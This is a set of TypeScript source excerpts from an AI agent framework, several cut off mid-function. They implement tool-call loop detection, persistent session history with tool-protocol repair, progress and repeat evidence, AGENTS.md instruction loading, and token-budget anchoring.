 * everything with wider context: round classification (it needs execution
 * observations), nudge delivery and logging, and terminal-result construction.
 */

/** Completed unchanged rounds before feedback and earliest stop. */
export const LOOP_WARN = 3;
export const LOOP_HARD = 5;

/** Near-duplicate loop_detection: nudge after this many CONSECUTIVE calls that
 *  are identical except for volatile id/timestamp
 *  fields. This tier catches "same call, fresh request-id/uuid each time"
 *  proposals without giving normalized matching stop authority. WARN-only by
 *  design: normalized matching is fuzzier than the exact tier, so a false
 *  positive must stay a benign one-time nudge, never a stop. An ignored nudge
 *  is bounded by the tool-round cap like any other unproductive work. */
export const NEAR_DUP_LOOP_WARN = 6;

/** Advisory thresholds only. Successful investigation can require many rounds;
 *  the global tool-loop budget and independent repeat guards still apply. */
export const RUN_NO_PROGRESS_NUDGE_ROUNDS = 2;
export const RUN_DISCOVERY_NUDGE_ROUNDS = 8;

/** What a tool round demonstrably added: productive effects, discovery of new
 * information, or none. Unknown outcomes and neutral coordination/waits skip
 * the counter. A successful tool return alone is not progress evidence. */
export type ToolRoundProgress = "neutral" | "unknown" | "none" | "discovery" | "productive";

/** Tools that only LOOK at state. A round made purely of these is exploration:
 *  eligible for an advisory reminder, not a separate execution limit. */
export const DISCOVERY_ONLY_TOOLS = new Set([
  "find",
  "grep_files",
  "list_files",
  "read_files",
  "search_files",
  "tool_result",
  "web_fetch",
  "web_search",
  "workspace_diff",
]);

export function mergeToolRoundProgress(
  current: ToolRoundProgress,
  next: ToolRoundProgress,
): ToolRoundProgress {
  if (current === "productive" || next === "productive") return "productive";
  if (current === "discovery" || next === "discovery") return "discovery";
  if (current === "unknown" || next === "unknown") return "unknown";
  if (current === "none" || next === "none") return "none";
  return "neutral";
}

/** Stable signature of a tool call for loop detection: name + canonical args.
 *  Only EXACT repeats (same tool, same input) share a signature, so legitimate
 *  varied calls never collide. */
export function toolCallSignature(call: { name: string; input: unknown }): string {
  const args = stableToolInputJson(call.input);
  return `${call.name}\u0000${args}`;
}

export function stableToolInputJson(value: unknown): string {
  const seen = new WeakSet<object>();
  const visit = (entry: unknown): unknown => {
    if (Array.isArray(entry)) return entry.map(visit);
    if (!entry || typeof entry !== "object") return entry;
    if (seen.has(entry)) return "[circular]";
    seen.add(entry);
    const out: Record<string, unknown> = {};
    for (const key of Object.keys(entry as Record<string, unknown>).sort()) {
      out[key] = visit((entry as Record<string, unknown>)[key]);
    }
    return out;
  };
  try { return JSON.stringify(visit(value ?? {})); }
  catch { return String(value); }
}

/** Argument keys that change on every call by nature (request-tracking ids,
 *  timestamps) and never define what the call DOES. Conservative on purpose: it
 *  excludes ambiguous keys like `id`, `seed`, `token`, `offset`, `page` that can
 *  be structural — so pagination and distinct targets never collapse. */
const VOLATILE_ARG_KEY_RE =
  /^(?:request_?id|req_?id|correlation_?id|idempotency_?key|trace_?id|span_?id|nonce|timestamp|created_?at|updated_?at)$/i;

/** Strip only by KEY NAME, not by value: a UUID/timestamp VALUE under a
 *  meaningful key (e.g. `record_id`, `ref`) is a real target and must stay, so
 *  fetching two different records never looks like a near-duplicate. Only keys
 *  that are request-tracking by nature (and change every call) are dropped. */
function stripVolatileArgs(value: unknown): unknown {
  if (Array.isArray(value)) return value.map(stripVolatileArgs);
  if (value && typeof value === "object") {
    const out: Record<string, unknown> = {};
    for (const [key, val] of Object.entries(value as Record<string, unknown>)) {
      if (VOLATILE_ARG_KEY_RE.test(key)) continue;
      out[key] = stripVolatileArgs(val);
    }
    return out;
  }
  return value;
}

/** Near-duplicate signature: `toolCallSignature` with volatile id/timestamp fields
 *  removed, so calls that differ ONLY in such fields share a signature. Structural
 *  args (path/url/query/offset/page/target) are preserved, so legitimate
 *  pagination and distinct targets stay distinct. Pure; unit-tested with matching
 *  and look-alike (must-not-match) fixtures. */
export function normalizedToolCallSignature(call: { name: string; input: unknown }): string {
  let args: string;
  try { args = JSON.stringify(stripVolatileArgs(call.input ?? {})); }
  catch { args = String(call.input); }
  return `${call.name}\u0000${args}`;
}

export type ProgressGovernorOutcome = {
  /** Fire this nudge through the request-control channel (the caller owns
   *  wording, delivery, and logging). At most one per stalled episode. */
  nudge: { kind: "no_progress" | "discovery"; rounds: number } | null;
  /** Compatibility field: coarse progress classifications never terminate. */
  stop: null;
};

export class LoopGuards {
  // Completed-round evidence and the separate proposal-only advisory.
  private completedSignature: string | null = null;
  private completedRounds = 0;
  private feedbackDelivered = false;
  private afterFeedbackRounds = 0;
  private evidenceNudgePending = false;
  private normSig: string | null = null;
  private normRepeat = 0;
  private normWarnedForStreak = false;
  private pendingRepeatNudge: string | null = null;

  // ── Progress governor ──
  private noProgressRounds = 0;
  private discoveryOnlyRounds = 0;
  private noProgressEpisodeNudged = false;
  private discoveryEpisodeNudged = false;

  /** Proven no-new-result rounds since observed progress. Unknown outcomes,
   *  successful coordination and bounded waits neither reset nor increment it. */
  get consecutiveNoProgressRounds(): number {
    return this.noProgressRounds;
  }

  // ── Convergence-signal flags (read by the loop's result meta). Set at the
  //    same moments the loop used to set its locals: repeat on delivery or
  //    hard stop, the others when their nudge/stop actually fires. ──
  repetitiveToolCallsDetected = false;
  noProgressNudgeSent = false;
  discoveryStallNudgeSent = false;

  /** Proposal similarity can advise, but never proves that execution stalled. */
  observeProposedCalls(
    calls: ReadonlyArray<{ name: string; input: unknown }>,
    inspectRead?: (call: { name: string; input: unknown }) => ToolReadContinuation | undefined,
  ): void {
    for (const call of calls) {
      const read = inspectRead?.(call);
      if (read?.waiting) {
        // Waiting on a live operation is not re-executing it. Its executor
        // owns the bounded wait/deadline; the global run budget still applies.
        this.normSig = null;
        this.normRepeat = 0;
        this.normWarnedForStreak = false;
        continue;
      }
      const nsig = read ? JSON.stringify([normalizedToolCallSignature(call), read.version]) : normalizedToolCallSignature(call);
      if (nsig === this.normSig) {
        this.normRepeat += 1;
      } else {
        this.normSig = nsig;
        this.normRepeat = 1;
        this.normWarnedForStreak = false;
      }
      if (this.normRepeat >= NEAR_DUP_LOOP_WARN && !this.normWarnedForStreak && !this.pendingRepeatNudge) {
        this.normWarnedForStreak = true;
        this.pendingRepeatNudge =
          `You have called ${call.name} ${this.normRepeat} times in a row with effectively the same arguments `
          + `(only volatile fields such as ids or timestamps differ). This is likely not making progress. `
          + `Change the target or your approach, or stop and report what you have so far.`;
      }
    }
  }

  resetCompletedRepeats(): void {
    this.completedSignature = null;
    this.completedRounds = this.afterFeedbackRounds = 0;
    this.feedbackDelivered = this.evidenceNudgePending = false;
  }

  /** Every executed sibling needs complete evidence. One batch is one feedback
   * round, regardless of repeated proposals inside it. Bounded digests retain
   * neither arguments nor results; overflow is inconclusive, never a stop. */
  observeCompletedRound(keys: readonly (string |
```

### Core Architecture Module: `src/core-agent/src/agent/persistent-session.ts`
```
import fs from "node:fs";
import path from "node:path";
import type {
  Message,
  MessageContent,
  ToolResultContent,
  ToolUseContent,
} from "../shared/types.js";
import type { ToolObservations } from "../tools/base.js";
import { createLogger } from "../shared/logger.js";
import {
  Session,
  type CompletedWorkEntry,
  type CompletedWorkInput,
  type ConversationHistoryReplaceOptions,
  type ExecutionPlanState,
  type ExecutionPlanUpdate,
  type HistoryResource,
  type SerializedSessionContextState,
  type ToolSurfaceState,
} from "./session.js";
import type { WorkspaceObservationEntry } from "./workspace-state.js";
import { SessionPersistenceError, errorCodeForLog } from "../shared/errors.js";

const log = createLogger("persistent-session");

/** Synthetic content written when a prior run aborted after the model
 * issued a tool_use but before the tool produced a tool_result. Both
 * OpenAI and Anthropic chat-completion contracts require tool_use to be
 * immediately followed by tool_result for the same id; history that
 * violates this rule silently hangs the provider stream on the next
 * turn. We heal the history at load time so those runs can recover
 * instead of looping in "thinking…" forever. */
const INTERRUPTED_TOOL_RESULT =
  "[interrupted: previous run aborted before this tool produced a result]";

export type ToolProtocolRepairReport = {
  changed: boolean;
  synthesizedOrphanResults: number;
  droppedUnmatchedResults: number;
  mergedParallelResultMessages: number;
  deduplicatedResults: number;
};

function emptyToolProtocolRepairReport(): ToolProtocolRepairReport {
  return {
    changed: false,
    synthesizedOrphanResults: 0,
    droppedUnmatchedResults: 0,
    mergedParallelResultMessages: 0,
    deduplicatedResults: 0,
  };
}

/**
 * PersistentSession — a `Session` that mirrors every message to a JSONL file
 * and can reload prior messages on construction.
 *
 * This is the standalone equivalent of OpenClaw's per-session JSONL history:
 * each session_id maps 1:1 to a file path, and opening the same session_id
 * again on a later run resumes the conversation.
 *
 * Format (one JSON object per line):
 *   { "role": "user", "content": [...], "ts": 1728000000000 }
 *
 * Unknown / malformed lines are skipped with a warning, not thrown — a
 * partially corrupted file on disk still recovers as much history as
 * possible rather than losing the entire session.
 */
export class PersistentSession extends Session {
  private readonly sessionFile: string;
  private readonly contextFile: string;
  private lastToolProtocolRepairReport = emptyToolProtocolRepairReport();
  private contextMutationDepth = 0;
  private contextWriteDirty = false;
  /** Byte position of each in-memory message's JSONL line. This makes a
   * canonical history tail replacement proportional to the changed tail
   * instead of rewriting every retained turn. */
  private messageStartOffsets: number[] = [];
  private sessionFileSize = 0;
  // Capture ordered disk operations, not the trimmed model/history window.
  // Runtime barriers stop new work while this queue cannot be drained.
  private pendingWrites: Array<() => void> = [];
  private persistenceFailure: string | undefined;
  private pendingFlush: Promise<void> | undefined;

  override hasPendingPersistence(): boolean {
    return this.pendingWrites.length > 0 || this.contextWriteDirty;
  }

  override async flushPending(signal?: AbortSignal): Promise<void> {
    if (!this.hasPendingPersistence()) return;
    if (this.pendingFlush) return this.pendingFlush;
    const flush = async () => {
      for (const waitMs of [200, 1_000, 3_000]) {
        await new Promise<void>((resolve, reject) => {
          const abort = () => {
            clearTimeout(timer);
            signal?.removeEventListener("abort", abort);
            reject(Object.assign(new Error("Run aborted"), { code: "ABORT_ERR" }));
          };
          const timer = setTimeout(() => {
            signal?.removeEventListener("abort", abort);
            resolve();
          }, waitMs);
          signal?.addEventListener("abort", abort, { once: true });
          if (signal?.aborted) abort();
        });
        this.persistenceFailure = undefined;
        this.attemptPersistence();
        if (!this.hasPendingPersistence()) return;
      }
      throw new SessionPersistenceError(this.persistenceFailure);
    };
    this.pendingFlush = flush();
    try { await this.pendingFlush; }
    finally { this.pendingFlush = undefined; }
  }

  private enqueueWrite(write: () => void): void {
    this.pendingWrites.push(write);
    this.attemptPersistence();
  }

  private attemptPersistence(): void {
    // Mutations during a failure retain data without restarting the retry budget.
    if (this.persistenceFailure) return;
    try {
      let written = 0;
      try {
        while (written < this.pendingWrites.length) {
          this.pendingWrites[written]();
          written++;
        }
      } finally {
        if (written) this.pendingWrites.splice(0, written);
      }
      if (this.contextWriteDirty && this.contextMutationDepth === 0) {
        this.persistContext();
        this.contextWriteDirty = false;
      }
    } catch (err) {
      this.persistenceFailure = errorCodeForLog(err);
      log.warn("session save pending", { code: this.persistenceFailure });
    }
  }

  constructor(opts: {
    /** Absolute path to the jsonl file that backs this session. */
    sessionFile: string;
    /** Per-parent-class option: cap on how many turns stay in memory. */
    maxHistoryTurns?: number;
  }) {
    super({
      maxHistoryTurns: opts.maxHistoryTurns,
    });
    this.sessionFile = opts.sessionFile;
    this.contextFile = `${opts.sessionFile}.context.json`;
    this.loadFromDisk();
  }

  /** Path to the backing jsonl file. */
  getSessionFile(): string {
    return this.sessionFile;
  }

  /** Session id derived from the jsonl basename (file stem). Used as
   * `prompt_cache_key` for providers that route cache by opaque string. */
  override getSessionId(): string {
    const base = path.basename(this.sessionFile);
    return base.endsWith(".jsonl") ? base.slice(0, -".jsonl".length) : base;
  }

  /**
   * Load prior messages from disk into memory. Called automatically by the
   * constructor; exposed so callers can force a reload (rare — mostly tests).
   */
  loadFromDisk(): void {
    if (this.hasPendingPersistence()) throw new SessionPersistenceError(this.persistenceFailure);
    super.clear();
    this.messageStartOffsets = [];
    this.sessionFileSize = 0;
    if (!fs.existsSync(this.sessionFile)) {
      // Context can legitimately exist before the first transcript row (for
      // example, a scoped tool surface is established while building the
      // runner). Restore that sidecar independently of JSONL existence.
      this.loadContextFromDisk();
      return;
    }

    let raw: Buffer;
    try {
      raw = fs.readFileSync(this.sessionFile);
      this.sessionFileSize = raw.length;
    } catch (err) {
      log.warn("session read failed", { code: errorCodeForLog(err) });
      this.loadContextFromDisk();
      return;
    }

    let lineStart = 0;
    const loadLine = (lineEnd: number) => {
      const trimmed = raw.subarray(lineStart, lineEnd).toString("utf-8").trim();
      const recordStart = lineStart;
      lineStart = lineEnd + 1;
      if (!trimmed) return;
      try {
        const obj = JSON.parse(trimmed) as { role?: string; content?: unknown; turnId?: unknown };
        if (
          (obj.role === "user" || obj.role === "assistant" || obj.role === "system" || obj.role === "developer") &&
          Array.isArray(obj.content)
        ) {
          super.addMessage(
            obj.role as Message["role"],
            obj.content as MessageContent[],
            Number.isInteger(obj.turnId) && (obj.turnId as number) > 0
              ? obj.turnId as number
              : undefined,
          );
          const dropped = Math.max(0, this.messageStartOffsets.length + 1 - this.length);
          if (dropped) this.messageStartOffsets.splice(0, dropped);
          this.messageStartOffsets.push(recordStart);
        }
      } catch {
        // Skip corrupt line — keep going rather than throwing away everything.
      }
    };
    for (let index = 0; index < raw.length; index++) {
      if (raw[index] === 0x0a) loadLine(index);
    }
    if (lineStart < raw.length) loadLine(raw.length);

    // Heal orphan `tool_use` entries — see `healOrphanToolUses` for why.
    // Runs after all lines parse so it operates on the full, loaded history
    // rather than one line at a time.
    if (this.healOrphanToolUses()) {
      this.flushToDisk();
      const report = this.lastToolProtocolRepairReport;
      if (report.synthesizedOrphanResults || report.droppedUnmatchedResults) {
        log.warn("repaired invalid tool protocol", report);
      } else {
        log.info("normalized parallel tool results", report);
      }
    }
    this.loadContextFromDisk();
  }

  /**
   * Heal **and persist** orphan tool_use entries in one call. Returns true
   * when the session needed repair (both in-memory and on disk). Safe to
   * call repeatedly; no-op on a clean session.
   *
   * This is the entry point callers should use *after* a turn ends
   * (successfully, aborted, or errored) to make sure the next turn sees
   * a provider-valid message array — the constructor's load-time heal
   * isn't enough when the session instance is cached across turns (see
   * `model/core-agent/session-store.ts`).
   */
  healAndPersist(): boolean {
    // Heal the cached in-memory session only. We deliberately do NOT flushToDisk:
    // by this point memory has been trimmed to the rolling window, and flushToDisk
    // rewrites the whole jsonl from that window — which would drop history older
    // than the window from the append-only log. The append log stays intact and
    // the constructor's load-time heal re-applies the same (
```

### Core Architecture Module: `src/core-agent/src/agent/progress-evidence.ts`
```
import type { FileChangeObservation, FileReadObservation, ToolReadContinuation, ToolResult } from "../tools/base.js";
import { mergeToolRoundProgress, type ToolRoundProgress } from "./loop-guards.js";

type Outcome = { result: ToolResult; err?: unknown; aborted?: boolean; stalled?: boolean };
type Range = [number, number];
const MAX_SOURCES = 512;
const MAX_RANGES = 128;
const MAX_ID_LENGTH = 8192;

/** Committed effects, not the success flag or an interpretation of output prose. */
function changeProgress(change: FileChangeObservation): ToolRoundProgress {
  if (change.beforeExists !== change.afterExists) return "productive";
  if (change.operation === "rename" && change.beforeExists && change.afterExists
      && change.destinationPath && change.destinationPath !== change.sourcePath) return "productive";
  if (!change.beforeExists && !change.afterExists) return "none";
  if (change.beforeHash !== undefined && change.afterHash !== undefined) {
    return change.beforeHash === change.afterHash ? "none" : "productive";
  }
  if (change.beforeBytes !== undefined && change.afterBytes !== undefined) {
    if (change.beforeBytes !== change.afterBytes) return "productive";
    if (change.beforeBytes === 0) return "none";
  }
  return "unknown";
}

/** Run-local evidence of delivered information. Missing facts are unknown.
 * No output/error parsing, workspace scan, persisted state, or model call.
 * Saturation conservatively skips new comparisons instead of declaring evicted
 * information new. A new context window can legitimately reload old sources.
 */
export class ProgressEvidence {
  private reads = new Map<string, Range[]>();
  private continuations = new Set<string>();

  reset(): void {
    this.reads.clear();
    this.continuations.clear();
  }

  observe(name: string, outcome: Outcome, continuation?: ToolReadContinuation, beforeRead?: ToolReadContinuation): ToolRoundProgress {
    const { result } = outcome;
    const failed = Boolean(outcome.aborted || outcome.stalled || outcome.err || result.isError);
    if (!failed && (name === "manage_execution_plan" || name === "tool_load")) return "neutral";
    let progress: ToolRoundProgress = "neutral";
    const observations = result.observations;
    if (observations?.stateMutation) {
      const state = observations.stateMutation;
      progress = state.scope && state.version && typeof state.changed === "boolean"
        ? (state.changed ? "productive" : "none") : "unknown";
    }
    for (const change of observations?.fileChanges ?? []) {
      let effect = changeProgress(change);
      // A partial shell snapshot can demonstrate a change, but a no-op in one
      // observed file does not prove that the entire command did nothing.
      if (effect === "none" && change.coverage === "partial") effect = "unknown";
      progress = mergeToolRoundProgress(progress, effect);
    }
    // A capped receipt does not prove that these exact ranges reached the model.
    if (!result.persistedOutput && !observations?.programExecution) {
      for (const read of observations?.fileReads ?? []) {
        progress = mergeToolRoundProgress(progress, this.observeRead(read));
      }
    } else if (observations?.fileReads?.length) {
      progress = mergeToolRoundProgress(progress, "unknown");
    }
    if (!failed && continuation) {
      let readProgress: ToolRoundProgress = "neutral";
      if (beforeRead?.waiting) {
        // An authorized wait can finish with output. Without the delivered
        // range in the receipt metadata, conservatively keep it neutral.
        readProgress = "neutral";
      } else if (beforeRead && beforeRead.version !== continuation.version) {
        // A producer may advance between the read and result commitment. Its
        // later revision is not proof that those bytes reached this result.
        readProgress = "unknown";
      } else if (!continuation.waiting) {
        const key = JSON.stringify([name, continuation.version]);
        if (key.length > MAX_ID_LENGTH) readProgress = "unknown";
        else if (this.continuations.has(key)) readProgress = "none";
        else if (this.continuations.size >= MAX_SOURCES) readProgress = "unknown";
        else {
          this.continuations.add(key);
          readProgress = "discovery";
        }
      }
      progress = mergeToolRoundProgress(progress, readProgress);
      if (progress === "neutral") return "neutral";
    }
    // Failures may accompany committed effects or useful new reads. Success,
    // exit codes and child counts alone prove neither advancement nor stasis.
    if (failed || observations?.execution || observations?.programExecution
        || observations?.fileReadBatch?.failed || observations?.resultRetrievalBatch?.failed) {
      progress = mergeToolRoundProgress(progress, "unknown");
    }
    return progress === "neutral" ? "unknown" : progress;
  }

  private observeRead(read: FileReadObservation): ToolRoundProgress {
    const bounds = read.charRange ?? read.lineRange;
    const chars = Boolean(read.charRange);
    if (!read.path || !read.hash || !bounds || bounds.length !== 2
        || !bounds.every(Number.isSafeInteger)
        || bounds[0] < (chars ? 0 : 1) || bounds[1] < bounds[0]) return "unknown";
    const start = bounds[0];
    const end = bounds[1] + (chars ? 0 : 1);
    if (!Number.isSafeInteger(end) || start === end) return "unknown";
    const key = JSON.stringify([read.path, read.hash, chars ? "chars" : "lines"]);
    if (key.length > MAX_ID_LENGTH) return "unknown";
    const previous = this.reads.get(key);
    if (!previous && this.reads.size >= MAX_SOURCES) return "unknown";
    const ranges = previous ?? [];
    if (ranges.some(([a, b]) => a <= start && b >= end)) return "none";
    const otherKey = JSON.stringify([read.path, read.hash, chars ? "lines" : "chars"]);
    const incomparable = this.reads.has(otherKey);
    const merged: Range[] = [];
    for (const range of [...ranges, [start, end] as Range].sort((a, b) => a[0] - b[0])) {
      const last = merged.at(-1);
      if (last && range[0] <= last[1]) last[1] = Math.max(last[1], range[1]);
      else merged.push([...range]);
    }
    if (merged.length > MAX_RANGES) return "unknown";
    this.reads.set(key, merged);
    return incomparable ? "unknown" : "discovery";
  }
}

```

### Core Architecture Module: `src/core-agent/src/agent/repeat-evidence.ts`
```
import { createHash } from "node:crypto";
import type { ToolReadContinuation, ToolResult } from "../tools/base.js";
import { toolCallSignature, type ToolRoundProgress } from "./loop-guards.js";

/** Stronger than advisory progress: all effects/information must be covered.
 * No result-text interpretation, I/O, replay or model decision. Unmeasured
 * subprocess effects, partial receipts and waits cannot authorize a stop. */
export function completedRepeatKey(
  call: { name: string; input: unknown },
  outcome: { result: ToolResult; err?: unknown; aborted?: boolean; stalled?: boolean; skipped?: boolean },
  progress: ToolRoundProgress,
  before?: ToolReadContinuation,
  after?: ToolReadContinuation,
): string | undefined {
  const { result } = outcome;
  if (progress !== "none" || outcome.err || outcome.aborted || outcome.stalled || outcome.skipped
      || result.isError || result.persistedOutput || result.images?.length || result.endTurn || result.synthesizeAndEndTurn
      || before?.waiting || after?.waiting) return;
  const o = result.observations;
  if (o?.execution || o?.programExecution || o?.coordination || o?.fileFailure
      || o?.fileReadBatch?.failed || o?.resultRetrievalBatch?.failed
      || o?.fileChanges?.some(change => change.coverage === "partial")) return;
  if (o?.fileReadBatch && o.fileReadBatch.succeeded !== o.fileReads?.length) return;
  if ((o?.fileChanges?.length ?? 0) + (o?.fileReads?.length ?? 0) > 256) return;
  const facts: unknown[] = [];
  for (const c of o?.fileChanges ?? []) facts.push(["file_change", c.operation, c.sourcePath,
    c.destinationPath, c.beforeExists, c.afterExists, c.beforeHash, c.afterHash, c.beforeBytes, c.afterBytes]);
  for (const r of o?.fileReads ?? []) facts.push(["file_read", r.path, r.hash, r.charRange, r.lineRange]);
  if (o?.stateMutation) {
    const s = o.stateMutation;
    if (s.changed !== false || !s.scope || !s.version) return;
    facts.push(["state_change", s.scope, s.version]);
  }
  if (before && after && before.version === after.version) facts.push(["continuation", after.version]);
  if (!facts.length || facts.length > 256) return;
  const evidence = JSON.stringify(facts);
  if (evidence.length > 32_768) return;
  return createHash("sha256").update(toolCallSignature(call)).update("\0").update(evidence).digest("hex");
}

```

### Core Architecture Module: `src/core-agent/src/agent/repository-instructions.ts`
```
import fs from "node:fs/promises";
import path from "node:path";
import type { Stats } from "node:fs";
import type { Session } from "./session.js";

export const REPOSITORY_INSTRUCTION_MAX_FILE_BYTES = 32 * 1024;
export const REPOSITORY_INSTRUCTION_MAX_TOTAL_BYTES = 64 * 1024;
export const REPOSITORY_INSTRUCTION_MAX_FILES = 16;
export type RepositoryInstructionFile = {
  path: string;
  directory: string;
  content: string;
  truncated: boolean;
};

export type RepositoryInstructions = {
  version: 1;
  workingDir: string;
  repositoryRoot: string;
  files: RepositoryInstructionFile[];
  discoveryTruncated?: boolean;
};

type InstructionSnapshot = { signature: string; context: RepositoryInstructions };
// Runners are rebuilt each turn; Session identity survives until eviction/reload.
// One bounded snapshot per live Session, never shared across accounts or persisted.
const snapshots = new WeakMap<Session, InstructionSnapshot>();

/** Read only the root-to-cwd instruction chain. Revalidate candidate metadata
 * each run (including absent files); reuse bodies while that chain is unchanged.
 * Descendant scopes are read by the model on demand through existing file tools. */
export async function discoverRepositoryInstructions(
  workingDir: string | undefined,
  session?: Session,
): Promise<RepositoryInstructions | undefined> {
  const cached = session ? snapshots.get(session) : undefined;
  // A failed/partial refresh must not leave an old snapshot available to reuse.
  if (session) snapshots.delete(session);
  if (!workingDir) return undefined;
  const cwd = path.resolve(workingDir);
  try {
    if (!(await fs.stat(cwd)).isDirectory()) return undefined;
  } catch {
    return undefined;
  }

  const repositoryRoot = await findRepositoryRoot(cwd) ?? cwd;
  const directories = repositoryDirectories(repositoryRoot, cwd);
  let cacheable = true;
  const candidates = await Promise.all(directories.map(async (directory) => {
    const filePath = path.join(directory, "AGENTS.md");
    let stat: Stats | undefined;
    try {
      stat = await fs.stat(filePath);
    } catch (error) {
      const code = (error as NodeJS.ErrnoException).code;
      if (code !== "ENOENT" && code !== "ENOTDIR") cacheable = false;
    }
    return { directory, filePath, stat };
  }));
  const signature = JSON.stringify([cwd, repositoryRoot, candidates.map(({ filePath, stat }) => [
    filePath,
    stat ? [stat.dev, stat.ino, stat.mode, stat.uid, stat.gid, stat.size, stat.mtimeMs, stat.ctimeMs] : null,
  ])]);
  if (cacheable && cached?.signature === signature) {
    if (session) snapshots.set(session, cached);
    return copyContext(cached.context);
  }

  const files: RepositoryInstructionFile[] = [];
  let remaining = REPOSITORY_INSTRUCTION_MAX_TOTAL_BYTES;
  let discoveryTruncated = !cacheable;
  for (const { directory, filePath, stat } of candidates) {
    if (files.length >= REPOSITORY_INSTRUCTION_MAX_FILES || remaining <= 0) {
      discoveryTruncated = true;
      break;
    }
    if (!stat?.isFile() || stat.size <= 0) continue;
    try {
      const instruction = await readBoundedInstruction(filePath, directory, remaining, stat);
      if (!instruction) continue;
      files.push(instruction);
      remaining -= Buffer.byteLength(instruction.content, "utf8");
      if (instruction.truncated) discoveryTruncated = true;
    } catch {
      cacheable = false;
      discoveryTruncated = true;
    }
  }
  const context: RepositoryInstructions = {
    version: 1,
    workingDir: cwd,
    repositoryRoot,
    files,
    ...(discoveryTruncated ? { discoveryTruncated: true } : {}),
  };
  if (session && cacheable) snapshots.set(session, { signature, context: copyContext(context) });
  return context;
}

function copyContext(context: RepositoryInstructions): RepositoryInstructions {
  return { ...context, files: context.files.map((file) => ({ ...file })) };
}

export function repositoryInstructionsText(
  context: RepositoryInstructions | undefined,
): string {
  if (!context) return "";
  const lines = [
    "[Repository context — host-discovered facts]",
    `Working directory: ${context.workingDir}`,
    `Repository root: ${context.repositoryRoot}`,
    "Only root-to-working-directory AGENTS.md files are preloaded below; subdirectories are not scanned. Do not reread these files solely to reload unchanged instructions.",
    "Before modifying files in a deeper or other authorized directory, check the target's ancestor directories for applicable AGENTS.md files not loaded here and read them with existing file tools. Reuse rules already read in this turn unless they change.",
    "AGENTS.md files are ordered shallow-to-deep. Each file applies only to files inside its directory subtree; a deeper applicable file takes precedence.",
  ];
  if (context.files.length) {
    for (const file of context.files) {
      lines.push(
        `\n--- ${file.path} (scope: ${file.directory}) ---\n`
        + `${file.content}${file.truncated ? "\n... [AGENTS.md truncated by host]" : ""}`,
      );
    }
  }
  if (context.discoveryTruncated) {
    lines.push(
      "Some repository instructions could not be fully loaded. Read missing or truncated applicable instructions before modifying files.",
    );
  }
  return lines.join("\n");
}

async function findRepositoryRoot(start: string): Promise<string | undefined> {
  let cursor = start;
  while (true) {
    try {
      const marker = await fs.stat(path.join(cursor, ".git"));
      if (marker.isDirectory() || marker.isFile()) return cursor;
    } catch { /* keep walking */ }
    const parent = path.dirname(cursor);
    if (parent === cursor) return undefined;
    cursor = parent;
  }
}

function repositoryDirectories(root: string, cwd: string): string[] {
  const relative = path.relative(root, cwd);
  if (relative.startsWith("..") || path.isAbsolute(relative)) return [root];
  const directories = [root];
  let cursor = root;
  for (const segment of relative.split(path.sep).filter(Boolean)) {
    cursor = path.join(cursor, segment);
    directories.push(cursor);
  }
  return directories;
}

async function readBoundedInstruction(
  filePath: string,
  directory: string,
  remainingBytes: number,
  stat: Stats,
): Promise<RepositoryInstructionFile | undefined> {
  const maxBytes = Math.min(
    REPOSITORY_INSTRUCTION_MAX_FILE_BYTES,
    remainingBytes,
    stat.size,
  );
  if (maxBytes <= 0) return undefined;

  let handle;
  try {
    handle = await fs.open(filePath, "r");
    const buffer = Buffer.alloc(maxBytes);
    const { bytesRead } = await handle.read(buffer, 0, maxBytes, 0);
    const content = buffer.subarray(0, bytesRead).toString("utf8").trim();
    if (!content) return undefined;
    return {
      path: filePath,
      directory,
      content,
      truncated: stat.size > bytesRead,
    };
  } finally {
    await handle?.close().catch(() => undefined);
  }
}

```

### Core Architecture Module: `src/core-agent/src/agent/request-token-anchor.ts`
```
/**
 * Request-token anchor.
 *
 * Request-level context decisions (per-round inline result ledger, the 0.82
 * budget line, emergency reduction) used to measure the whole request with the
 * local estimator, whose absolute error scales with request size — CJK text is
 * weighed at 1.5 tokens/char against real tokenizers' ~0.6-1.0, and image
 * blocks at a flat per-block figure regardless of their real dimension-scaled
 * cost. The provider already reports what the
 * previous request actually cost, so the anchor ties those decisions to that
 * real measurement and applies the estimator only to what changed since:
 *
 *   anchored = realTokens + (estimateNow − estimateAtAnchor)
 *
 * The differential cancels the estimator's absolute error; only the delta —
 * typically this round's tool results — is estimated. When no anchor is valid
 * (a fold earlier in the same prepare phase discards it), there is nothing to
 * anchor to, so the caller's session calibration is applied to the whole
 * estimate — the same de-biasing the segment triggers use. Without it a
 * request-level line (the 0.82 emergency/overflow lines) would compare an
 * uncalibrated estimate, which on CJK-heavy or image-heavy context runs high
 * and fires those lines on a request that is really well under them.
 *
 * Folding, archiving, and
 * other rewrites of already-anchored content cannot be attributed by the
 * differential, so any such rewrite bumps `Session.contentEpoch()` and the
 * anchor is discarded until the next completed call re-anchors. Segment-level
 * triggers (active-process / history) measure *which part* of the context can
 * fold, which a single real total cannot attribute — they stay estimator-based
 * on purpose.
 *
 * Pure arithmetic — no Session, no runner, no I/O.
 */

import type { Usage } from "../shared/types.js";

export type RequestTokenAnchor = {
  /** Real request+response footprint of the anchored call. */
  realTokens: number;
  /** Full-request estimate captured at the same instant, same request shape. */
  estimatedTokens: number;
  /** `Session.contentEpoch()` at the anchor point. */
  contentEpoch: number;
};

export type AnchoredRequestTokens = {
  tokens: number;
  /** Which measurement produced `tokens`; logged so refusals and compaction
   *  decisions can be attributed to the estimator or to provider truth. */
  source: "anchored" | "estimated";
};

/**
 * Full request+response footprint of one completed call.
 *
 * pi-ai normalizes usage for every adapter so `input` excludes the cache
 * components (verified for anthropic-messages and openai-completions: OpenAI's
 * `prompt_tokens` has `cached_tokens` subtracted back out), so the four fields
 * sum to the whole context the provider actually processed. Returns 0 when the
 * prompt side is unreported — a zero anchor would misprice every later
 * decision, so callers must not anchor on it.
 */
export function usageRequestFootprintTokens(usage: Usage | undefined): number {
  if (!usage) return 0;
  const input = Math.max(0, usage.inputTokens || 0);
  const cacheRead = Math.max(0, usage.cacheReadTokens || 0);
  const cacheWrite = Math.max(0, usage.cacheWriteTokens || 0);
  const promptSide = input + cacheRead + cacheWrite;
  if (promptSide <= 0) return 0;
  return promptSide + Math.max(0, usage.outputTokens || 0);
}

/** Resolve the request size for a decision: anchored when the anchor is still
 *  valid for the session's current content epoch, estimator otherwise. */
export function anchoredRequestTokens(
  anchor: RequestTokenAnchor | null,
  estimatedNow: number,
  contentEpochNow: number,
  /** Session estimator calibration (real/estimated, clamped [0.5,1]). Applied
   *  only to the estimate fallback; the anchored branch is already real. */
  estimatorCalibration = 1,
): AnchoredRequestTokens {
  if (
